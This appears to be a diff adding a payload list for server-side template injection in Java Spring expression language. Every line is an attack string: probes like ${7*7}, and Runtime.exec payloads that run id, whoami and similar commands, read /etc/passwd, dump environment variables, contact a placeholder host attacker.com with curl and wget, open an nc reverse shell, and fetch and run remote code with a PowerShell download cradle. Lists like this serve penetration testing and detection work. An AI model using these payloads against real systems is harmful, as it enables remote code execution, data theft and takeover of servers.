@@ -1,0 +1,15 @@
+${7*7}
+[[${7*7}]]
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.System).getenv()}
+${T(java.lang.System).getProperty('os.name')}
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+${T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com')}
+${T(java.lang.Runtime).getRuntime().exec('wget http://attacker.com')}
+${T(java.lang.Runtime).getRuntime().exec('nc attacker.com 4444 -e /bin/bash')}
+${T(java.lang.Runtime).getRuntime().exec('powershell -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com\')\"')}
+${T(java.lang.Runtime).getRuntime().exec('cmd.exe /c dir')}
+${T(java.lang.Runtime).getRuntime().exec('ls -la')}
+${T(java.lang.Runtime).getRuntime().exec('whoami')}
+${T(java.lang.Runtime).getRuntime().exec('uname -a')}
